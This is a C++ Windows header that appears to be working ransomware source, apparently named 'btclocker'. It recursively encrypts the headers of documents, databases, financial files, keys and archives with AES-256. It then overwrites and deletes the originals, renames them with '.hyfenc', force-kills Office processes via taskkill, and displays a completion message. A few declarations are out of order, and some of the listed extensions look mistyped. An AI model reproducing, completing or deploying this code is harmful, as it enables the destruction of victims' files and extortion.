#pragma once
#pragma once
#define NOMINMAX
#undef min
#undef max
#include <iostream>
#include <fstream>
#include <vector>
#include <cstdint>
#include <filesystem>
#include <random>
#include <algorithm>
#include <Windows.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <atomic>
#include <unordered_set>
#include <sstream>
#include <iomanip>
#include <memory>
#include <climits>
#include <intrin.h> // 添加硬件检测支持
#include "message.h"
#include"rsa.h"
void SecureDelete(const fs::path& path);
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key);
constexpr DWORD HEADER_ENCRYPT_SIZE = 4096; // 仅加密文件头4KB
constexpr DWORD KEY_LENGTH = 32; // AES-256
constexpr DWORD IV_LENGTH = 16;  // AES块大小

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Ole32.lib")

namespace fs = std::filesystem;

// RAII包装器
class BcryptAlgorithmHandle {
public:
    BcryptAlgorithmHandle() : handle_(nullptr) {}
    ~BcryptAlgorithmHandle() {
        if (handle_) {
            BCryptCloseAlgorithmProvider(handle_, 0);
        }
    }

    BCRYPT_ALG_HANDLE* get() { return &handle_; }
    operator BCRYPT_ALG_HANDLE() const { return handle_; }

    BCRYPT_ALG_HANDLE handle_;
};

class BcryptKeyHandle {
public:
    BcryptKeyHandle() : handle_(nullptr) {}
    ~BcryptKeyHandle() {
        if (handle_) {
            BCryptDestroyKey(handle_);
        }
    }

    BCRYPT_KEY_HANDLE* get() { return &handle_; }
    operator BCRYPT_KEY_HANDLE() const { return handle_; }

    BCRYPT_KEY_HANDLE handle_;
};

// 辅助函数
std::string to_hex(NTSTATUS status) {
    std::stringstream ss;
    ss << "0x" << std::hex << std::setw(8) << std::setfill('0') << status;
    return ss.str();
}

// 检测CPU是否支持AES-NI指令集
bool IsAesNiSupported() {
#if defined(_MSC_VER) && (defined(_M_IX86) || defined(_M_X64))
    int cpuInfo[4] = { -1 };
    __cpuid(cpuInfo, 1); // 请求功能标志
    return (cpuInfo[2] & (1 << 25)) != 0; // 检查ECX第25位 (AES-NI)
#elif defined(__GNUC__) && (defined(__i386__) || defined(__x86_64__))
    unsigned int eax, ebx, ecx, edx;
    __asm__ __volatile__("cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(1));
    return (ecx & (1 << 25)) != 0;
#elif defined(_WIN32)
    // 备选Windows检测方法
    typedef BOOL(WINAPI* PfnIsProcessorFeaturePresent)(DWORD);
    PfnIsProcessorFeaturePresent pIsPP =
        (PfnIsProcessorFeaturePresent)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")),
            "IsProcessorFeaturePresent");

    if (pIsPP) {
        const DWORD PF_AES_INSTRUCTIONS_AVAILABLE = 17;
        return pIsPP(PF_AES_INSTRUCTIONS_AVAILABLE);
    }
    return false;
#elif defined(__aarch64__) || defined(_M_ARM64)
    // ARM64平台的AES扩展检测
    uint64_t val;
    __asm__ __volatile__("mrs %0, id_aa64isar0_el1" : "=r"(val));
    return (val & (0xF << 4)) != 0; // AES bitfield[7:4]
#else
    return false;
#endif
}

// 线程安全队列（增加路径去重）
template<typename T>
class ConcurrentQueue {
public:
    bool try_pop(T& value) {
        std::lock_guard<std::mutex> lock(mutex_);
        if (queue_.empty()) return false;
        value = std::move(queue_.front());
        queue_.pop();
        return true;
    }

    void push(T value) {
        std::lock_guard<std::mutex> lock(mutex_);
        if (unique_paths_.find(value.string()) != unique_paths_.end()) return;
        unique_paths_.insert(value.string());
        queue_.push(std::move(value));
    }

    bool empty() const {
        std::lock_guard<std::mutex> lock(mutex_);
        return queue_.empty();
    }

private:
    std::queue<T> queue_;
    std::unordered_set<std::string> unique_paths_;
    mutable std::mutex mutex_;
};

// 智能线程池（支持工作窃取和动态线程管理）
class EncryptionThreadPool {
public:
    EncryptionThreadPool(BYTE* masterKey, size_t minThreads, size_t maxThreads)
        : stop_(false) {
        masterKey_.reset(new BYTE[KEY_LENGTH]);
        memcpy(masterKey_.get(), masterKey, KEY_LENGTH);

        // 动态计算线程数
        threadCount_ = CalculateDynamicThreadCount(minThreads, maxThreads);

        // 创建工作线程
        for (size_t i = 0; i < threadCount_; ++i) {
            threads_.emplace_back([this] { worker(); });
        }
    }

    ~EncryptionThreadPool() {
        stop();
        for (auto& thread : threads_) {
            if (thread.joinable()) thread.join();
        }
    }

    void addBatchTasks(const std::vector<fs::path>& files) {
        std::lock_guard<std::mutex> lock(set_mutex_);
        for (const auto& file : files) {
            if (processed_files_.find(file.string()) == processed_files_.end()) {
                processed_files_.insert(file.string());
                {
                    std::lock_guard<std::mutex> qlock(queue_mutex_);
                    tasks_.push(file);
                }
            }
        }
        condition_.notify_all();
    }

    void stop() {
        {
            std::lock_guard<std::mutex> lock(queue_mutex_);
            stop_ = true;
        }
        condition_.notify_all();
    }

    void waitCompletion() {
        std::unique_lock<std::mutex> lock(queue_mutex_);
        completion_condition_.wait(lock, [this] {
            return tasks_.empty() && active_tasks_ == 0;
            });
    }

private:
    size_t CalculateDynamicThreadCount(size_t minThreads, size_t maxThreads) {
        size_t coreCount = std::thread::hardware_concurrency();
        if (coreCount == 0) coreCount = 4; // 默认4线程

        // 获取系统内存信息
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(memInfo);
        if (!GlobalMemoryStatusEx(&memInfo)) {
            return std::clamp(coreCount * 2, minThreads, maxThreads);
        }

        // 计算每GB内存可支持的线程数
        DWORDLONG totalPhysMemGB = memInfo.ullTotalPhys / (1024 * 1024 * 1024);
        size_t memBasedThreads = static_cast<size_t>(totalPhysMemGB) * 4;

        // 核心数 * 2 + 内存系数，上限为maxThreads
        size_t dynamicCount = std::min(coreCount * 2 + memBasedThreads, maxThreads);
        return std::clamp(dynamicCount, minThreads, maxThreads);
    }

    void worker() {
        while (true) {
            fs::path file;
            {
                std::unique_lock<std::mutex> lock(queue_mutex_);
                condition_.wait(lock, [this] {
                    return stop_ || !tasks_.empty();
                    });

                if (stop_ && tasks_.empty()) break;
                if (tasks_.empty() && !try_steal_work(file)) continue;

                if (file.empty()) {
                    file = std::move(tasks_.front());
                    tasks_.pop();
                }
                active_tasks_++;
            }

            try {
                processFile(file);
            }
            catch (const std::exception& e) {
                std::cerr << "[Thread " << std::this_thread::get_id() << "] "
                    << "Error processing " << file << ": " << e.what() << std::endl;

                // 失败时移除标记
                std::lock_guard<std::mutex> lock(set_mutex_);
                processed_files_.erase(file.string());
            }

            {
                std::lock_guard<std::mutex> lock(queue_mutex_);
                active_tasks_--;
                if (tasks_.empty() && active_tasks_ == 0) {
                    completion_condition_.notify_all();
                }
            }
        }
    }

    bool try_steal_work(fs::path& file) {
        if (tasks_.empty()) return false;
        file = std::move(tasks_.front());
        tasks_.pop();
        return true;
    }

    void processFile(const fs::path& file) {
        fs::path outputFile = file;
        outputFile += ".hyfenc";

        if (EncryptFileCNG(file, outputFile, masterKey_.get())) {
            // 安全删除原文件
            fs::path deletingFile = file;
            deletingFile += ".deleting";
            fs::rename(file, deletingFile);
            SecureDelete(deletingFile);

            std::cout << "[Thread " << std::this_thread::get_id() << "] "
                << "Encrypted and deleted: " << file << std::endl;
        }
        else {
            std::cerr << "[Thread " << std::this_thread::get_id() << "] "
                << "Failed to encrypt: " << file << std::endl;

            // 失败时移除标记并删除部分加密文件
            std::lock_guard<std::mutex> lock(set_mutex_);
            processed_files_.erase(file.string());
            std::error_code ec;
            fs::remove(outputFile, ec);
        }
    }

    std::unique_ptr<BYTE[]> masterKey_;
    std::queue<fs::path> tasks_;
    std::vector<std::thread> threads_;
    std::mutex queue_mutex_;
    std::condition_variable condition_;
    std::atomic<bool> stop_{ false };
    std::atomic<int> active_tasks_{ 0 };
    std::condition_variable completion_condition_;
    size_t threadCount_;

    // 文件状态跟踪
    std::unordered_set<std::string> processed_files_;
    mutable std::mutex set_mutex_;
};

fs::path GetUserDocumentsPath() {
#if defined(_WIN32)
    PWSTR path = nullptr;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &path);
    if (SUCCEEDED(hr)) {
        fs::path docsPath(path);
        CoTaskMemFree(path);
        return docsPath;
    }
    std::cerr << "SHGetKnownFolderPath failed: 0x" << std::hex << hr << std::endl;
#else
    const char* homeDir = getenv("HOME");
    if (homeDir) {
        fs::path docsPath = fs::path(homeDir) / "Documents";
        if (fs::exists(docsPath)) return docsPath;
        return homeDir;
    }
#endif
    return fs::current_path();
}

void SecureDelete(const fs::path& path) {
    if (!fs::exists(path)) return;

    try {
        std::fstream file(path, std::ios::binary | std::ios::in | std::ios::out);
        if (file.is_open()) {
            file.seekg(0, std::ios::end);
            auto size = file.tellg();
            file.seekg(0);

            std::vector<char> randomData(size);
            std::random_device rd;
            std::independent_bits_engine<std::mt19937, CHAR_BIT, unsigned short> engine(rd());
            std::generate(randomData.begin(), randomData.end(), engine);

            file.write(randomData.data(), size);
            file.close();
        }
        fs::remove(path);
    }
    catch (const std::exception& e) {
        std::cerr << "SecureDelete failed: " << e.what() << std::endl;
    }
}

void GenerateRandomKey(BYTE* key, DWORD length) {
#if defined(_WIN32)
    NTSTATUS status = BCryptGenRandom(
        NULL, key, length, BCRYPT_USE_SYSTEM_PREFERRED_RNG
    );
    if (!NT_SUCCESS(status)) {
        throw std::runtime_error("BCryptGenRandom failed: " + to_hex(status));
    }
#else
    std::ifstream urandom("/dev/urandom", std::ios::binary);
    if (!urandom.read(reinterpret_cast<char*>(key), length)) {
        throw std::runtime_error("Failed to read from /dev/urandom");
    }
#endif
}

bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName) {
    fs::path savePath = GetUserDocumentsPath() / fileName;

    try {
        std::ofstream keyFile(savePath, std::ios::binary);
        if (!keyFile) return false;

        keyFile.write(reinterpret_cast<const char*>(key), length);
        return keyFile.good();
    }
    catch (...) {
        return false;
    }
}

bool CanAccessFile(const fs::path& filePath) {
#if defined(_WIN32)
    return ::_waccess(filePath.c_str(), 4) == 0;
#else
    return ::access(filePath.c_str(), R_OK) == 0;
#endif
}

// 核心加密函数（仅加密文件头4KB）
bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key) {
    BcryptAlgorithmHandle hAlgorithm;
    BcryptKeyHandle hKey;
    std::vector<BYTE> pbKeyObject;
    std::vector<BYTE> pbIV(IV_LENGTH);
    DWORD cbKeyObject = 0;
    NTSTATUS status;

    try {
        // 1. 初始化算法提供程序 - 根据硬件支持选择最佳实现
        bool hwAccelSupported = IsAesNiSupported();
        const wchar_t* algorithmProvider = hwAccelSupported ?
            BCRYPT_AES_ALGORITHM : // 使用硬件加速实现
            MS_PRIMITIVE_PROVIDER;  // 默认软件实现

        status = BCryptOpenAlgorithmProvider(hAlgorithm.get(), algorithmProvider, NULL, 0);
        if (!NT_SUCCESS(status)) {
            // 尝试回退到默认实现
            status = BCryptOpenAlgorithmProvider(hAlgorithm.get(), BCRYPT_AES_ALGORITHM, NULL, 0);
            if (!NT_SUCCESS(status)) {
                throw std::runtime_error("BCryptOpenAlgorithmProvider failed: " + to_hex(status));
            }
        }

        // 2. 获取密钥对象大小
        DWORD cbData = 0;
        status = BCryptGetProperty(*hAlgorithm.get(), BCRYPT_OBJECT_LENGTH,
            reinterpret_cast<PBYTE>(&cbKeyObject),
            sizeof(DWORD), &cbData, 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptGetProperty(OBJECT_LENGTH) failed: " + to_hex(status));
        }

        // 3. 分配密钥对象内存
        pbKeyObject.resize(cbKeyObject);

        // 4. 设置加密模式为CBC
        const wchar_t* chainMode = BCRYPT_CHAIN_MODE_CBC;
        status = BCryptSetProperty(*hAlgorithm.get(), BCRYPT_CHAINING_MODE,
            reinterpret_cast<PBYTE>(const_cast<wchar_t*>(chainMode)),
            static_cast<ULONG>(wcslen(chainMode) * sizeof(wchar_t)), 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptSetProperty failed: " + to_hex(status));
        }

        // 5. 生成对称密钥
        status = BCryptGenerateSymmetricKey(
            *hAlgorithm.get(),
            hKey.get(),
            pbKeyObject.data(),
            cbKeyObject,
            const_cast<BYTE*>(key),
            KEY_LENGTH,
            0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptGenerateSymmetricKey failed: " + to_hex(status));
        }

        // 6. 生成随机IV
        status = BCryptGenRandom(NULL, pbIV.data(), IV_LENGTH, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptGenRandom failed: " + to_hex(status));
        }

        // 7. 打开输入文件
        HANDLE hInput = CreateFileW(inputFile.c_str(), GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hInput == INVALID_HANDLE_VALUE) {
            throw std::runtime_error("CreateFile failed for input");
        }

        // 获取文件大小
        LARGE_INTEGER fileSize;
        if (!GetFileSizeEx(hInput, &fileSize)) {
            CloseHandle(hInput);
            throw std::runtime_error("GetFileSizeEx failed");
        }

        // 8. 创建输出文件
        HANDLE hOutput = CreateFileW(outputFile.c_str(), GENERIC_WRITE, 0,
            NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hOutput == INVALID_HANDLE_VALUE) {
            CloseHandle(hInput);
            throw std::runtime_error("CreateFile failed for output");
        }

        // 写入IV
        DWORD bytesWritten;
        if (!WriteFile(hOutput, pbIV.data(), IV_LENGTH, &bytesWritten, NULL) || bytesWritten != IV_LENGTH) {
            CloseHandle(hInput);
            CloseHandle(hOutput);
            throw std::runtime_error("Failed to write IV");
        }

        // 9. 仅加密文件头4KB
        const DWORD dataToEncrypt = (fileSize.QuadPart > HEADER_ENCRYPT_SIZE) ?
            HEADER_ENCRYPT_SIZE : static_cast<DWORD>(fileSize.QuadPart);

        // 读取文件头
        std::vector<BYTE> plaintextBlock(dataToEncrypt);
        DWORD bytesRead;
        if (!ReadFile(hInput, plaintextBlock.data(), dataToEncrypt, &bytesRead, NULL) || bytesRead != dataToEncrypt) {
            CloseHandle(hInput);
            CloseHandle(hOutput);
            throw std::runtime_error("Failed to read file header");
        }

        // 加密文件头
        ULONG cbResult = 0;
        std::vector<BYTE> ciphertextBlock(dataToEncrypt + IV_LENGTH);
        status = BCryptEncrypt(
            *hKey.get(),
            plaintextBlock.data(),
            dataToEncrypt,
            nullptr,
            pbIV.data(),
            IV_LENGTH,
            ciphertextBlock.data(),
            static_cast<ULONG>(ciphertextBlock.size()),
            &cbResult,
            BCRYPT_BLOCK_PADDING
        );

        if (!NT_SUCCESS(status)) {
            CloseHandle(hInput);
            CloseHandle(hOutput);
            throw std::runtime_error("BCryptEncrypt failed: " + to_hex(status));
        }

        // 写入加密后的文件头
        if (!WriteFile(hOutput, ciphertextBlock.data(), cbResult, &bytesWritten, NULL) || bytesWritten != cbResult) {
            CloseHandle(hInput);
            CloseHandle(hOutput);
            throw std::runtime_error("Failed to write encrypted header");
        }

        // 10. 处理剩余文件内容（不加密）
        if (fileSize.QuadPart > HEADER_ENCRYPT_SIZE) {
            const LARGE_INTEGER offset = { HEADER_ENCRYPT_SIZE };
            if (!SetFilePointerEx(hInput, offset, NULL, FILE_BEGIN)) {
                CloseHandle(hInput);
                CloseHandle(hOutput);
                throw std::runtime_error("SetFilePointerEx failed");
            }

            constexpr DWORD BUFFER_SIZE = 65536; // 64KB缓冲区
            std::vector<BYTE> buffer(BUFFER_SIZE);
            LONGLONG remaining = fileSize.QuadPart - HEADER_ENCRYPT_SIZE;

            while (remaining > 0) {
                DWORD toRead = (remaining > BUFFER_SIZE) ? BUFFER_SIZE : static_cast<DWORD>(remaining);
                if (!ReadFile(hInput, buffer.data(), toRead, &bytesRead, NULL) || bytesRead == 0) {
                    break;
                }

                if (!WriteFile(hOutput, buffer.data(), bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
                    CloseHandle(hInput);
                    CloseHandle(hOutput);
                    throw std::runtime_error("Failed to write file body");
                }

                remaining -= bytesRead;
            }
        }

        CloseHandle(hInput);
        CloseHandle(hOutput);
        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "Encryption Error: " << e.what() << std::endl;
        return false;
    }
}

// 主加密逻辑
void traverseAndEncrypt(const fs::path& directoryPath, const std::vector<std::string>& extensions) {
    try {
        if (!fs::exists(directoryPath) || !fs::is_directory(directoryPath)) {
            std::cerr << "Invalid directory: " << directoryPath << std::endl;
            return;
        }

        // 生成并保存密钥
        BYTE encryptionKey[KEY_LENGTH];
        GenerateRandomKey(encryptionKey, KEY_LENGTH);
        if (!SaveKeyToDocuments(encryptionKey, KEY_LENGTH, L"btclocker_key.bin")) {
            std::cerr << "Failed to save encryption key!" << std::endl;
            return;
        }

        // 初始化线程池（动态线程数）
        EncryptionThreadPool pool(encryptionKey, 4, 64); // 最小4线程，最大64线程
        std::cout << "Starting encryption with dynamic thread pool..." << std::endl;

        // 收集目标文件
        std::vector<fs::path> targetFiles;
        for (const auto& entry : fs::recursive_directory_iterator(
            directoryPath, fs::directory_options::skip_permission_denied)) {

            if (!entry.is_regular_file()) continue;

            std::string ext = entry.path().extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), [](unsigned char c) {
                return std::tolower(c);
                });

            bool shouldEncrypt = std::any_of(extensions.begin(), extensions.end(),
                [&](const std::string& targetExt) {
                    std::string lowerTarget = targetExt;
                    std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(),
                        [](unsigned char c) { return std::tolower(c); });
                    return ext == lowerTarget;
                });

            if (shouldEncrypt && CanAccessFile(entry.path())) {
                targetFiles.push_back(entry.path());
            }
        }

        // 批处理提交任务（每批100个文件）
        const size_t batchSize = 100;
        for (size_t i = 0; i < targetFiles.size(); i += batchSize) {
            auto start = targetFiles.begin() + i;
            auto end = (i + batchSize) < targetFiles.size() ?
                start + batchSize : targetFiles.end();
            std::vector<fs::path> batch(start, end);
            pool.addBatchTasks(batch);
        }

        // 等待所有任务完成
        pool.waitCompletion();
        std::cout << "Finished processing " << targetFiles.size() << " files." << std::endl;
    }
    catch (const std::exception& e) {
        std::cerr << "Critical error: " << e.what() << std::endl;
    }
}

// 主函数
int encrypthf() {
    // 检查硬件加速支持
    bool hwAccelSupported = IsAesNiSupported();
    std::cout << "AES Hardware Acceleration: " << (hwAccelSupported ? "SUPPORTED" : "NOT SUPPORTED") << std::endl;

    if (!hwAccelSupported) {
        std::cout << "Warning: Hardware acceleration (AES-NI) not detected. "
            << "Encryption will be performed in software mode, which may be slower." << std::endl;
    }

    // 关闭可能干扰的应用程序
    system("taskkill /f /im winword.exe > nul 2>&1");
    system("taskkill /f /im excel.exe > nul 2>&1");
    system("taskkill /f /im powerpnt.exe > nul 2>&1");
    Sleep(500);

    // 目标扩展名列表
    std::vector<std::string> extensions = {
        // 核心业务文档
        ".doc", ".docx", ".xlsx", ".xls", ".pptx", ".pdf",
        // 数据库与备份
        ".mdf", ".ndf", ".bak", ".sqlite", ".db", ".ldf",
        // 财务数据
        ".qbb", ".qbo", ".ofx",
        // 代码与配置
        ".javass", ".pys", ".jss", ".ymls", ".inis", ".envs",
        // 设计稿与工程
        ".psd", ".ai", ".dwg", ".skp",
        // 系统与安全
        ".vmdk", ".iso", ".pfx", ".pems",
        // 邮件与协作
        ".pst", ".mbox", ".mpp",
        // 压缩包
        ".jar", ".zip", ".tar.gz",
        "pptx","ppt","jpg","png","txt","jpeg"
    };

    // 目标目录
    fs::path targetDirectory = fs::current_path();
    std::cout << "Target directory: " << targetDirectory << std::endl;
    traverseAndEncrypt(targetDirectory, extensions);
    showtext(); // 显示加密完成提示
    // rsaencrypt();
    return 0;
}